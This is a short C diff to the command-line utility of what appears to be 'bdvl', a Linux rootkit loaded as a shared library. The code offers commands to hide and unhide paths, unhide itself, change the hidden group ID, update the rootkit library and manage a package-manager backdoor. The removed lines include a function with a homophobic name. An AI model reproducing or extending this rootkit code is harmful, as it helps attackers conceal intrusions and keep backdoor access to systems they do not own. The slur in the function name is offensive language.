@@ -1,6 +1,6 @@
 void option_err(char *a0){
     printf("\e[1;31mValid commands:\e[0m\n");
-    printf("  %s update build/*.so.*\n", a0);
+    printf("  %s update bdvl.so.*\n", a0);
     printf("  %s hide/unhide <path>\n", a0);
     printf("  %s uninstall\n", a0);
     printf("  %s unhideself\n", a0);
@@ -9,12 +9,13 @@ void option_err(char *a0){
     printf("  %s changegid\n", a0);
 #endif
 #ifdef BACKDOOR_PKGMAN
-    size_t tmpsize, buflen;
+    size_t tmpsize, buflen, cursize=0;
     char validmans[16*VALIDPKGMANS_SIZE];
     memset(validmans, 0, sizeof(validmans));
     for(int i = 0; i < VALIDPKGMANS_SIZE; ++i){
-        tmpsize = strlen(validpkgmans[i])+2, buflen = strlen(validmans);
-        if(buflen+tmpsize >= sizeof(validmans)-1)
+        tmpsize = strlen(validpkgmans[i])+2, buflen = strlen(validmans),
+        cursize = buflen+tmpsize;
+        if(cursize >= sizeof(validmans)-1)
             break;
 
         char tmp[tmpsize];
@@ -192,11 +193,6 @@ void dobdvutil(char *const argv[]){
     }
 #endif
 
-    if(!strcmp("killme", option)){
-        bdvlsuperreallygay();
-        exit(0);
-    }
-
     if(!strcmp("update", option)){
         bdvupdate(argv);
         exit(0);
@@ -217,11 +213,6 @@ void dobdvutil(char *const argv[]){
 
     if(!strcmp("makelinks", option)){
         symlinkstuff();
-        exit(0);
-    }
-
-    if(!strcmp("soname", option)){
-        printf("%s", BDVLSO);
         exit(0);
     }
 
